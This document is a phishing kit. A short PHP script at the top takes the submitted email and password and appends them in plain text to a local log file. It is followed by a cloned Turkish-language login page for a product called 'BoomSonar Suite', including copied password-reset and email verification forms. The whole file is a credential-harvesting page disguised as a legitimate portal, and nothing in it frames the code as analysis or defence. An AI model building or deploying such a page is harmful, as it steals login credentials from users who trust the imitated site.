<?php
// Kullanıcı adı ve parola alınır
$username = $_POST['email'];
$password = $_POST['password'];

// Dosya adı
$logFile = 'userlog.txt';

// Kullanıcı adı ve parolayı bir satır olarak dosyaya yazma
$logData = "Kullanıcı adı: $username - Parola: $password\n";
file_put_contents($logFile, $logData, FILE_APPEND);

// Log verilerini ekrana yazdırma
echo "Kullanıcı adı ve parola başarıyla loglandı.";

// Diğer işlemler buraya eklenebilir
?>


<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width" />
    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no" />
    <title>BoomSonar Suite - Login | Tick Tock Boom</title>
    <link href="/Content/css/fontAvesome/css/font-awesome.min.css" rel="stylesheet" />
    <link href="/Content/css/fontAvesome5/css/light.css" rel="stylesheet" />
    <link href="/Content/Styles/Login?v=aeYzAyJ2xO9eushklrEPTIB7sTkeWca2aur5tZEoV981" rel="stylesheet"/>

    <script src="/Content/Scripts/Login?v=GKsH3curfioRSpl0M-7ATPzefnfqP8YRDPaXrXVDjrI1"></script>

</head>
<body class="fixed-header">
    <script type="text/javascript">
    </script>
    <input type="hidden" id="resultMessage" />

    <div class="login-wrapper ">

        <div class="bg-pic">
            <img src="" data-src="" data-src-retina="" alt="">
        </div>

        <div class="login-container bg-white">

            <div class=" m-l-20 p-r-50 m-r-20 p-t-50 m-t-30 sm-p-l-15 sm-p-r-15 sm-p-t-40 text-center">
                <img src="/Content/img/BoomSonar-Login-Mini-Logo.png" alt="Boomsonar" title="Boomsonar" data-src="~/Content/img/BoomSonar-Login-Mini-Logo.png" data-src-retina="~/Content/img/BoomSonar-Login-Mini-Logo.png">
                <p>&nbsp;</p>
<form action="/Account/Login" data-ajax="true" data-ajax-begin="ls" data-ajax-method="POST" data-ajax-success="lr" id="form0" method="post"><input name="__RequestVerificationToken" type="hidden" value="xkxa8YJYX5GW2Uxk5vSgBhZ5htabv7SzXc285qgP_HrLGFrO397pZtJzSOll9tVBDaAlqZ0an_BXEi6WgRm2gLSHT8U1" />                    <div class="normal-login">
                        <div id="loginForm" class="visible">
                            <div class="form-group form-group-default">
                                
                                <div class="controls">
                                    <input name="email" id="email" type="email" placeholder="E-posta Adresi" class="form-control" required>
                                </div>
                            </div>
                            <div class="form-group form-group-default">
                                
                                <div class="controls">
                                    <input type="password" id="password" name="password" class="form-control" placeholder="Lütfen şifrenizi giriniz" required>
                                    <i class="fa fa-eye show-hide-password"></i>
                                </div>
                            </div>

                            <div class="form-group form-group-default">
                                
                                <select class="new-login-txt" id="culture" name="lang">
                                    <option value="tr" selected = &quot;selected&quot;>TÃ¼rkÃ§e</option>
                                    <option value="en" >English</option>
                                    <option value="fr" >French</option>
                                </select>
                            </div>
                        </div>
                        <div id="tokenField" class="form-group form-group-default" style="display: none;">
                            
                            <div class="controls">
                                <input type="text" name="authtoken" id="authtoken" class="form-control" maxlength="25" placeholder="Güvenlik Anahtarı" autofocus>
                            </div>
                        </div>

                        <div class="row">
                            <button class="btn btn-primary btnLogin" id="btnLogin" type="submit">Giriş</button>
                            
                        </div>
                        <div class="row" id="forgotPassword">
                            <div class="col-md-12 text-center">
                                <a href="#" onclick="forgotPass()" class="text-info small">şifremi unuttum</a>
                            </div>
                        </div>

                    </div>
</form>                <form action="/Account/ValidateCode" data-ajax="true" data-ajax-begin="ls" data-ajax-method="POST" data-ajax-success="lr" id="form1" method="post"><input name="__RequestVerificationToken" type="hidden" value="a398rCIpWe3rsqZ4G41JKuyAvBNkq7dDd9w6ZIEJwdwvHskjMwxn4Vdi4enwmtr7B-_dyaISrrZzZyNALc-HaOdk2n41" />                    <div class="validateForm" style="display:none">
                        <div id="validateForm" class="">

                            <input name="validationemail" id="validationemail" type="hidden" class="form-control" />
                            <input type="hidden" id="validationpassword" name="validationpassword" class="form-control" />
                            <input type="hidden" id="validationlang" name="validationlang" />

                            <div class="form-group form-group-default">

                                <div class="controls">
                                    <input type="text" name="validationcode" id="validationcode" class="form-control" placeholder="Lütfen e-postanıza gönderilen kodu giriniz" required>
                                </div>
                            </div>
                            <div class="form-group form-group-default">
                                <div class="controls" id="validationtimer"></div>
                            </div>

                        </div>

                        <div class="row">
                            <button class="btn btn-primary btnLogin" id="btn-validate-code" type="submit">Tamam</button>
                        </div>


                    </div>
</form>
<form action="/Account/ForgotPassword" data-ajax="true" data-ajax-begin="fb" data-ajax-method="POST" data-ajax-success="processResult" id="form2" method="post"><input name="__RequestVerificationToken" type="hidden" value="HqeskW3TEncJx7mQbBAyCaz_tHZ-38DrDvPOx0rOnuCWx_SN4cn--u47TEuNLfpMNmU78ttn3X4nHwCcs7_NarwM5T81" />                    <div class="forgot-password-area">
                        <div class="form-group form-group-default" style="border: 0px; padding-left: 0;">
                            Şifrenizi sıfırlamak için lütfen aşağıya e-posta adresinizi girin.
                        </div>
                        <div class="form-group form-group-default">
                            
                            <div class="controls">
                                <input name="email" id="fpemail" type="email" placeholder="E-posta Adresi" class="form-control" required>
                            </div>
                        </div>
                        <input id="lang" name="lang" type="hidden" value="tr" />
                        <button class="btn btn-primary btnForgotPassword" type="submit">gönder</button>
                        <div class="row">
                            <div class="col-md-6 no-padding">
                                &nbsp;
                            </div>
                            <div class="col-md-6 text-right">
                                &nbsp;
                            </div>
                        </div>
                        <div class="row">
                            <div class="col-md-12 no-padding text-center">
                                <a href="#" onclick="goLogin()" class="text-info small">< GERİ DÖN</a>
                            </div>

                        </div>
                    </div>
</form>
<form action="/Account/ChangePassword" data-ajax="true" data-ajax-method="POST" data-ajax-success="processResult" id="form3" method="post"><input name="__RequestVerificationToken" type="hidden" value="UGruspr0n7W0-Qe6bs8ZN1p9CBi-WOl45BKKEnvsrEsCAMLvlNtWBS-eNRw5vRZhYzDFlSCIR_X0OuHBCEIAaNBVgkI1" />                    <div class="re-enter-password-area">
                        <div class="form-group form-group-default" style="border: 0px; padding-left: 0;">
                            Şifrenizi tekrar oluşturmak için aşağıdaki alanları doldurun
                        </div>

                        <div class="form-group form-group-default">
                            
                            <div class="controls">
                                <input name="email" id="cpemail" type="email" placeholder="E-posta Adresi" class="form-control" readonly="readonly" required>
                            </div>
                        </div>
                        <div class="form-group form-group-default">
                            
                            <div class="controls">
                                <input type="password" name="password1" class="form-control" placeholder="Lütfen şifrenizi giriniz" required>
                                <i class="fa fa-eye show-hide-password"></i>
                            </div>
                        </div>

                        <div class="form-group form-group-default">
                            
                            <div class="controls">
                                <input type="password" name="password2" class="form-control" placeholder="Lütfen şifrenizi giriniz" required>
                                <i class="fa fa-eye show-hide-password"></i>
                            </div>
                        </div>

                        <div class="row">
                            <div class="col-md-6 no-padding">
                                &nbsp;
                            </div>
                            <div class="col-md-6 text-right">
                                &nbsp;
                            </div>
                        </div>
                        <input id="token" name="token" type="hidden" value="" />
                        <button class="btn btn-primary btn-cons m-t-10 " type="submit">gönder</button>
                    </div>
</form>
            </div>
            <p class="small login-footer" style="position: absolute; bottom: 10px; color: #B3B3B5; text-align:center;width:100%;">
                <a href="/Account/SalesContract" target="_blank"><span class="yasalmetin" data-item="salescontract">Satış Sözleşmesi</span></a>
                <a href="/Account/PrivacyStatement" target="_blank"><span class="yasalmetin" data-item="privacystatement">Gizlilik Sözleşmesi</span></a>
                <br />
                <span class="">Â© 2024 BOOMSONAR</span>
            </p>
        </div>
    </div>

    <script>
        var changing = 'false';
    </script>
</body>
</html>

 <!-- Action Executing Time 00:00.00 ...--> 
